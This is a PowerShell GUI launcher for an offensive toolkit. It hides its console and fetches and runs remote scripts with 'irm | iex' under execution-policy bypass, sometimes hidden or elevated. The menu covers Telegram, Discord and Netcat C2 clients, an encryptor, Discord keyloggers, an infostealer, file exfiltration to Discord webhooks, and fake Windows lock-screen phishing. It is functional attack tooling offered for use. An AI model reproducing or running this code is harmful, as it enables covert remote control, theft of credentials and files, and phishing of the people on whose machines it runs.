<#
======================================= Beigeworm's Toolset GUI ==========================================

SYNOPSIS
All useful tools in one place.
A selection of Powershell tools from this repo can be ran from this script.

USAGE
1. Replace the URLS and TOKENS below. (they can also be added by running the script)
2. Run the script and follow options in the GUI

INFO
Closing this script will NOT close any scripts that were started from this script.
Any background/hidden scripts eg. C2 clients will keep running.

raw shortlink - https://is.gd/bwtoolset

#>
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic
[System.Windows.Forms.Application]::EnableVisualStyles()

if ($dc.Length -eq 0){$dc = "https://discord.com/api/webhooks/..."} # Change this to open GUI with your details
if ($tk.Length -eq 0){$tk = "MTE2MzEX4MP1ETOKEN1Ng.GKTKb_.rTP4s3tZLkIw89fuj4w890fhj9iiH"} # Change this to open GUI with your details
if ($ch.Length -eq 0){$ch = "1207060610454516934"} # Change this to open GUI with your details
if ($tg.Length -eq 0){$tg = "Ex4mP137eLeGr4m_4pI-B0t_T0k3N"} # Change this to open GUI with your details
if ($NCurl.Length -eq 0){$NCurl = "192.168.0.1"} # Change this to open GUI with your details
if ($DLurl.Length -eq 0){$DLurl = "https://github.com/user/repo/raw/main/yourfile.exe"} # Change this to open GUI with your details

$hidewindow = 1
If ($HideWindow -gt 0){
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

$imageUrl = "https://i.ibb.co/ZGrt8qb/b-min.png"
$client = New-Object System.Net.WebClient
$imageBytes = $client.DownloadData($imageUrl)
$ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)

$form = New-Object System.Windows.Forms.Form
$form.Text = " | Beigeworms's Toolset |"
$form.Size = New-Object System.Drawing.Size(660,750)
$form.Font = 'Microsoft Sans Serif,10'
$form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)
$form.BackColor = "#242424"

$dropdownHeader = New-Object System.Windows.Forms.Label
$dropdownHeader.Text = "Select Tool Here"
$dropdownHeader.ForeColor = "#bcbcbc"
$dropdownHeader.AutoSize = $true
$dropdownHeader.Width = 25
$dropdownHeader.Height = 10
$dropdownHeader.Location = New-Object System.Drawing.Point(20, 10)
$form.Controls.Add($dropdownHeader)

$WebhookInputHeader = New-Object System.Windows.Forms.Label
$WebhookInputHeader.Text = "Discord Webhook URL (For All Other Discord Scripts)"
$WebhookInputHeader.ForeColor = "#bcbcbc"
$WebhookInputHeader.AutoSize = $true
$WebhookInputHeader.Width = 25
$WebhookInputHeader.Height = 10
$WebhookInputHeader.Location = New-Object System.Drawing.Point(20, 60)
$form.Controls.Add($WebhookInputHeader)

$WebhookInput = New-Object System.Windows.Forms.TextBox
$WebhookInput.Text = "$dc" # you can set this now for efficiency (optional)
$WebhookInput.Location = New-Object System.Drawing.Point(20, 80)
$WebhookInput.BackColor = "#eeeeee"
$WebhookInput.Width = 600
$WebhookInput.Height = 40
$WebhookInput.Multiline = $false
$form.Controls.Add($WebhookInput)

$TokenInputHeader = New-Object System.Windows.Forms.Label
$TokenInputHeader.Text = "Telegram API Token (For PoshGram C2)"
$TokenInputHeader.ForeColor = "#bcbcbc"
$TokenInputHeader.AutoSize = $true
$TokenInputHeader.Width = 25
$TokenInputHeader.Height = 10
$TokenInputHeader.Location = New-Object System.Drawing.Point(20, 110)
$form.Controls.Add($TokenInputHeader)

$TGTokenInput = New-Object System.Windows.Forms.TextBox
$TGTokenInput.Text = "$tg"  # you can set this now for efficiency (optional)
$TGTokenInput.Location = New-Object System.Drawing.Point(20, 130)
$TGTokenInput.BackColor = "#eeeeee"
$TGTokenInput.Width = 600
$TGTokenInput.Height = 40
$TGTokenInput.Multiline = $false
$form.Controls.Add($TGTokenInput)

$DCTokenInputHeader = New-Object System.Windows.Forms.Label
$DCTokenInputHeader.Text = "Discord BOT Token (For PoshCord C2)"
$DCTokenInputHeader.ForeColor = "#bcbcbc"
$DCTokenInputHeader.AutoSize = $true
$DCTokenInputHeader.Width = 25
$DCTokenInputHeader.Height = 10
$DCTokenInputHeader.Location = New-Object System.Drawing.Point(20, 160)
$form.Controls.Add($DCTokenInputHeader)

$DCTokenInput = New-Object System.Windows.Forms.TextBox
$DCTokenInput.Text = "$tk" # you can set this now for efficiency (optional)
$DCTokenInput.Location = New-Object System.Drawing.Point(20, 180)
$DCTokenInput.BackColor = "#eeeeee"
$DCTokenInput.Width = 600
$DCTokenInput.Height = 40
$DCTokenInput.Multiline = $false
$form.Controls.Add($DCTokenInput)

$DCChanInputHeader = New-Object System.Windows.Forms.Label
$DCChanInputHeader.Text = "Discord Channel ID (For PoshCord C2)"
$DCChanInputHeader.ForeColor = "#bcbcbc"
$DCChanInputHeader.AutoSize = $true
$DCChanInputHeader.Width = 25
$DCChanInputHeader.Height = 10
$DCChanInputHeader.Location = New-Object System.Drawing.Point(20, 210)
$form.Controls.Add($DCChanInputHeader)

$DCChanInput = New-Object System.Windows.Forms.TextBox
$DCChanInput.Text = "$ch" # you can set this now for efficiency (optional)
$DCChanInput.Location = New-Object System.Drawing.Point(20, 230)
$DCChanInput.BackColor = "#eeeeee"
$DCChanInput.Width = 600
$DCChanInput.Height = 40
$DCChanInput.Multiline = $false
$form.Controls.Add($DCChanInput)

$NetcatHeader = New-Object System.Windows.Forms.Label
$NetcatHeader.Text = "Netcat IPv4 Address"
$NetcatHeader.ForeColor = "#bcbcbc"
$NetcatHeader.AutoSize = $true
$NetcatHeader.Width = 25
$NetcatHeader.Height = 10
$NetcatHeader.Location = New-Object System.Drawing.Point(20, 260)
$form.Controls.Add($NetcatHeader)

$netcatInput = New-Object System.Windows.Forms.TextBox
$netcatInput.Text = "$NCurl" # you can set this now for efficiency (optional)
$netcatInput.Location = New-Object System.Drawing.Point(20, 280)
$netcatInput.BackColor = "#eeeeee"
$netcatInput.Width = 600
$netcatInput.Height = 40
$netcatInput.Multiline = $false
$form.Controls.Add($netcatInput)

$DLfileHeader = New-Object System.Windows.Forms.Label
$DLfileHeader.Text = "Direct Download File URL"
$DLfileHeader.ForeColor = "#bcbcbc"
$DLfileHeader.AutoSize = $true
$DLfileHeader.Width = 25
$DLfileHeader.Height = 10
$DLfileHeader.Location = New-Object System.Drawing.Point(20, 310)
$form.Controls.Add($DLfileHeader)

$DLfileInput = New-Object System.Windows.Forms.TextBox
$DLfileInput.Text = "$DLurl" # you can set this now for efficiency (optional)
$DLfileInput.Location = New-Object System.Drawing.Point(20, 330)
$DLfileInput.BackColor = "#eeeeee"
$DLfileInput.Width = 600
$DLfileInput.Height = 40
$DLfileInput.Multiline = $false
$form.Controls.Add($DLfileInput)

$startButton = New-Object System.Windows.Forms.Button
$startButton.Location = New-Object System.Drawing.Point(540, 30)
$startButton.Size = New-Object System.Drawing.Size(80, 30)
$startButton.Text = "Start"
$startButton.BackColor = "#fff"
$form.Controls.Add($startButton)

$infoButton = New-Object System.Windows.Forms.Button
$infoButton.Location = New-Object System.Drawing.Point(450, 30)
$infoButton.Size = New-Object System.Drawing.Size(80, 30)
$infoButton.Text = "Info"
$infoButton.BackColor = "#fff"
$form.Controls.Add($infoButton)

$OutputHeader = New-Object System.Windows.Forms.Label
$OutputHeader.Text = "Output"
$OutputHeader.ForeColor = "#bcbcbc"
$OutputHeader.AutoSize = $true
$OutputHeader.Width = 25
$OutputHeader.Height = 10
$OutputHeader.Location = New-Object System.Drawing.Point(20, 360)
$form.Controls.Add($OutputHeader)

$OutputBox = New-Object System.Windows.Forms.TextBox 
$OutputBox.Multiline = $True;
$OutputBox.Location = New-Object System.Drawing.Point(20, 380) 
$OutputBox.Width = 600
$OutputBox.Height = 300
$OutputBox.Scrollbars = "Vertical" 
$form.Controls.Add($OutputBox)

$items = @(
"Telegram C2 Client"                    
"Discord C2 Client"        
"NetCat C2 Client"         
"LAN Toolset"              
"Encryptor"                
"Decryptor"                
"Filetype Finder GUI"      
"Screen Recorder GUI"      
"Network Enumeration GUI"  
"Microphone Muter GUI"     
"Webhook Spammer GUI"      
"Social Search GUI"        
"GDI effects GUI"          
"Mouse Recorder GUI"      
"System Metrics GUI"       
"PoSh Control (tray)"       
"Find Text string in Files"
"Minecraft Server Scanner"     
"Console Task Manager"         
"Dummy Folder Creator"   
"Matrix Cascade"    
"Github Repo Search & Invoke"
"Global Powershell Logging"
"Terminal Shortcut Creator"
"Text Cipher Tool"
"System Information to File"
"Day/Night Bliss Wallpaper"
"Environment Variable Encoder"
"Bad USB Detect & Protect"
"USB Poison"
"Browser DB Files Viewer"
"Chrome Extension Keylogger to DC"
"Discord Infostealer"
"Exfiltrate to Discord"
"PS Trascription to Discord"
"Discord Keylogger"
"Record Screen to Discord"
"Windows 10 Login to DC"
"Windows 11 Login to DC"
"Windows Idiot Prank"
"Memz in Powershell"
"Persistant Goose"
)

$dropdown = New-Object System.Windows.Forms.ComboBox
$dropdown.Location = New-Object System.Drawing.Point(20, 30)
$dropdown.Size = New-Object System.Drawing.Size(250, 30)
$dropdown.Items.AddRange($items)
$form.Controls.Add($dropdown)

Function Add-OutputBoxLine{
    Param ($outfeed) 
    $OutputBox.AppendText("`r`n$outfeed")
    $OutputBox.Refresh()
    $OutputBox.ScrollToCaret()
}

$startButton.Add_Click({
    $selectedItem = $dropdown.SelectedItem
    if($selectedItem.length -eq 0 ){Add-OutputBoxLine -Outfeed "Nothing Selected! Please choose a tool from the dropdown menu.";return}
    Add-OutputBoxLine -Outfeed "$selectedItem Selected"
    $BaseURL = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main"
    $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
    $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Terminal.ps1"
    $dc = $WebhookInput.Text
    $tk = $DCTokenInput.Text
    $ch = $DCChanInput.Text
    $tg = $TGTokenInput.Text
    $NCurl = $netcatInput.Text
    $DLurl = $DLfileInput.Text
    # Webhook shortened URL handler
    $dc = (irm $dc).url


    switch ($selectedItem) {
"Telegram C2 Client"                    {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
"Discord C2 Client"                     {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
"NetCat C2 Client"                      {$url = "$BaseURL/NC-Func.ps1";$hide = 1}
"LAN Toolset"                           {$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
"Encryptor"                             {$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
"Decryptor"                             {$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
"Filetype Finder GUI"                   {$url = "$BaseURL/GUI%20Tools/Search-Folders-For-Filetypes-GUI.ps1";$hide = 1}
"Screen Recorder GUI"                   {$url = "$BaseURL/GUI%20Tools/Record-Screen-GUI.ps1";$hide = 1}
"Network Enumeration GUI"               {$url = "$BaseURL/GUI%20Tools/Network%20Enumeration%20GUI.ps1";$hide = 1}
"Microphone Muter GUI"                  {$url = "$BaseURL/GUI%20Tools/Mute%20Microphone%20GUI.ps1";$hide = 1}
"Webhook Spammer GUI"                   {$url = "$BaseURL/GUI%20Tools/Discord%20Webhook%20Spammer%20GUI.ps1";$hide = 1}
"Social Search GUI"                     {$url = "$BaseURL/GUI%20Tools/Social%20Search%20GUI.ps1";$hide = 1}
"GDI effects GUI"                       {$url = "$BaseURL/GUI%20Tools/Desktop-GDI-Efects-GUI.ps1";$hide = 1}
"Mouse Recorder GUI"                    {$url = "$BaseURL/GUI%20Tools/Mouse-Recorder-GUI.ps1";$hide = 1}
"System Metrics GUI"                    {$url = "$BaseURL/GUI%20Tools/System-Metrics-GUI.ps1";$hide = 1}
"PoSh Control (tray)"                   {$url = "https://raw.githubusercontent.com/beigeworm/PoSh-Control/main/PoSh-Control.ps1";$admin = 1}
"Find Text string in Files"             {$url = "$BaseURL/Misc/Find%20Text%20string%20in%20Files.ps1"}
"Minecraft Server Scanner"              {$url = "$BaseURL/Misc/Minecraft-Server-Scanner-and-Server-Info.ps1"}
"Console Task Manager"                  {$url = "$BaseURL/Misc/Console-Task-Manager.ps1"}
"Dummy Folder Creator"                  {$url = "$BaseURL/Misc/Dummy-Folder-Creator.ps1"}
"Matrix Cascade"                        {$url = "$BaseURL/Misc/Matrix-Cascade-in-Powershell.ps1"}
"Github Repo Search & Invoke"           {$url = "$BaseURL/Misc/Github-Repo-PS-Search-and-Invoke.ps1"}
"Global Powershell Logging"             {$url = "$BaseURL/Misc/Global-PS-Logging.ps1"}
"Terminal Shortcut Creator"             {$url = "$BaseURL/Misc/Terminal-Shortcut-Creator.ps1"}
"Text Cipher Tool"                      {$url = "$BaseURL/Misc/Text-Cipher-Tool.ps1"}
"System Information to File"            {$url = "$BaseURL/Information%20Enumeration/Sys-Info-to-File.ps1"}
"Day/Night Bliss Wallpaper"             {$url = "$BaseURL/Misc/Day-Night-Bliss-Wallpaper-Schedulded.ps1"}
"Environment Variable Encoder"          {$url = "$BaseURL/Misc/Environment-Variable-Encoder.ps1"}
"Bad USB Detect & Protect"              {$url = "$BaseURL/Misc/BadUSB-Detect-and-Protect.ps1";$admin = 1}
"USB Poison"                            {$url = "$BaseURL/Misc/USB-Poison.ps1"}   
"Browser DB Files Viewer"               {$url = "$BaseURL/Information%20Enumeration/Browser-DB-File-Viewer.ps1";$admin = 1} 
"Chrome Extension Keylogger to DC"      {$url = "https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Chrome-Extension-Keylogger/main.ps1";$hide = 1}
"Discord Infostealer"                   {$url = "https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Discord-Infostealer/main.ps1";$hide = 1} 
"Exfiltrate to Discord"                 {$url = "https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Exfiltrate-to-Discord/main.ps1";$hide = 1} 
"PS Trascription to Discord"            {$url = "https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1";$hide = 1}
"Discord Keylogger"                     {$url = "https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Discord-Keylogger/main.ps1";$hide = 1}
"Record Screen to Discord"              {$url = "https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Record-Screen-to-Discord/main.ps1";$hide = 1}
"Windows 10 Login to DC"                {$url = "https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/blob/main/Win10-Phishing/main.ps1";$hide = 1}
"Windows 11 Login to DC"                {$url = "https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/blob/main/Win11-Phishing/main.ps1";$hide = 1}
"Windows Idiot Prank"                   {$url = "$BaseURL/Pranks/Windows-Idiot-Prank.ps1";$hide = 1}
"Memz in Powershell"                    {$url = "$BaseURL/Pranks/PoshMEMZ-Prank.ps1";$hide = 1}
"Persistant Goose"                      {$url = "$BaseURL/Pranks/Persistant-Goose.ps1";$hide = 1}
    }
    Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"

if ($admin -eq 1){
    Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -C `$tg = `'$tg`' ; `$tk = `'$tk`' ; `$dc = `'$dc`' ; `$ch = `'$ch`' ; `$NCurl = `'$NCurl`' ; irm $url | iex") -Verb RunAs
    Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
    $admin = 0
}
elseif ($hide -eq 1){
    Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ; `$tk = `'$tk`' ; `$dc = `'$dc`' ; `$ch = `'$ch`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
    Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
    $hide = 0
}
else{
    Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -C `$tg = `'$tg`' ; `$tk = `'$tk`' ; `$dc = `'$dc`' ; `$ch = `'$ch`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
    Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
}



})

$infoButton.Add_Click({
    $OutputBox.Clear()
    $selectedItem = $dropdown.SelectedItem
    if($selectedItem.length -eq 0 ){Add-OutputBoxLine -Outfeed "Nothing Selected! Please choose a tool from the dropdown menu.";return}
    Add-OutputBoxLine -Outfeed "$selectedItem Information/Help"
    Add-OutputBoxLine -Outfeed "=================================================================================="
    $BaseURL = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main"
    $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"

    switch ($selectedItem) {
"Telegram C2 Client"                    {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
"Discord C2 Client"                     {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
"NetCat C2 Client"                      {$url = "$BaseURL/NC-Func.ps1"}
"LAN Toolset"                           {$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
"Encryptor"                             {$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
"Decryptor"                             {$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
"Filetype Finder GUI"                   {$url = "$BaseURL/GUI%20Tools/Search-Folders-For-Filetypes-GUI.ps1"}
"Screen Recorder GUI"                   {$url = "$BaseURL/GUI%20Tools/Record-Screen-GUI.ps1"}
"Network Enumeration GUI"               {$url = "$BaseURL/GUI%20Tools/Network%20Enumeration%20GUI.ps1"}
"Microphone Muter GUI"                  {$url = "$BaseURL/GUI%20Tools/Mute%20Microphone%20GUI.ps1"}
"Webhook Spammer GUI"                   {$url = "$BaseURL/GUI%20Tools/Discord%20Webhook%20Spammer%20GUI.ps1"}
"Social Search GUI"                     {$url = "$BaseURL/GUI%20Tools/Social%20Search%20GUI.ps1"}
"GDI effects GUI"                       {$url = "$BaseURL/GUI%20Tools/Desktop-GDI-Efects-GUI.ps1"}
"Mouse Recorder GUI"                    {$url = "$BaseURL/GUI%20Tools/Mouse-Recorder-GUI.ps1"}
"System Metrics GUI"                    {$url = "$BaseURL/GUI%20Tools/System-Metrics-GUI.ps1"}
"PoSh Control (tray)"                   {$url = "https://raw.githubusercontent.com/beigeworm/PoSh-Control/main/PoSh-Control.ps1"}
"Find Text string in Files"             {$url = "$BaseURL/Misc/Find%20Text%20string%20in%20Files.ps1"}
"Minecraft Server Scanner"              {$url = "$BaseURL/Misc/Minecraft-Server-Scanner-and-Server-Info.ps1"}
"Console Task Manager"                  {$url = "$BaseURL/Misc/Console-Task-Manager.ps1"}
"Dummy Folder Creator"                  {$url = "$BaseURL/Misc/Dummy-Folder-Creator.ps1"}
"Matrix Cascade"                        {$url = "$BaseURL/Misc/Matrix-Cascade-in-Powershell.ps1"}
"Github Repo Search & Invoke"           {$url = "$BaseURL/Misc/Github-Repo-PS-Search-and-Invoke.ps1"}
"Global Powershell Logging"             {$url = "$BaseURL/Misc/Global-PS-Logging.ps1"}
"Terminal Shortcut Creator"             {$url = "$BaseURL/Misc/Terminal-Shortcut-Creator.ps1"}
"Text Cipher Tool"                      {$url = "$BaseURL/Misc/Text-Cipher-Tool.ps1"}
"System Information to File"            {$url = "$BaseURL/Information%20Enumeration/Sys-Info-to-File.ps1"}
"Day/Night Bliss Wallpaper"             {$url = "$BaseURL/Misc/Day-Night-Bliss-Wallpaper-Schedulded.ps1"}
"Environment Variable Encoder"          {$url = "$BaseURL/Misc/Environment-Variable-Encoder.ps1"}
"Bad USB Detect & Protect"              {$url = "$BaseURL/Misc/BadUSB-Detect-and-Protect.ps1"}
"USB Poison"                            {$url = "$BaseURL/Misc/USB-Poison.ps1"}    
"Browser DB Files Viewer"               {$url = "$BaseURL/Information%20Enumeration/Browser-DB-File-Viewer.ps1"} 
"Chrome Extension Keylogger to DC"      {$url = "$BaseURL/Discord%20Scripts/Chrome-Keylogger-Extension.ps1"}
"Discord Infostealer"                   {$url = "$BaseURL/Discord%20Scripts/Discord-Infostealer.ps1"} 
"Exfiltrate to Discord"                 {$url = "$BaseURL/Discord%20Scripts/Exfiltrate%20Files%20to%20Discord.ps1"} 
"PS Trascription to Discord"            {$url = "$BaseURL/Discord%20Scripts/Global-PS-Logging-to-DC.ps1"}
"Discord Keylogger"                     {$url = "$BaseURL/Discord%20Scripts/LogKeys%20to%20Discord%20-%20Activity%20Intelligence.ps1"}
"Record Screen to Discord"              {$url = "$BaseURL/Discord%20Scripts/Record-Screen-to-Discord.ps1"}
"Windows 10 Login to DC"                {$url = "$BaseURL/Phishing/Fake%20Windows%2010%20Lockscreen%20to%20Webhook.ps1"}
"Windows 11 Login to DC"                {$url = "$BaseURL/Phishing/Fake%20Windows%2011%20Lockscreen%20to%20Webhook.ps1"}
"Windows Idiot Prank"                   {$url = "$BaseURL/Pranks/Windows-Idiot-Prank.ps1"}
"Memz in Powershell"                    {$url = "$BaseURL/Pranks/PoshMEMZ-Prank.ps1"}
"Persistant Goose"                      {$url = "$BaseURL/Pranks/Persistant-Goose.ps1"}
    }
    $fileContent = Invoke-RestMethod -Uri $Url
    $pattern = '(?s)<#(.*?)#>'
    $matches = [regex]::Matches($fileContent, $pattern)
    foreach ($match in $matches) {
        $textInsideHashTags = $match.Groups[1].Value
        Add-OutputBoxLine -Outfeed $textInsideHashTags
    }
    Add-OutputBoxLine -Outfeed "=================================================================================="
    Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"
})
[Windows.Forms.Application]::Run($form)
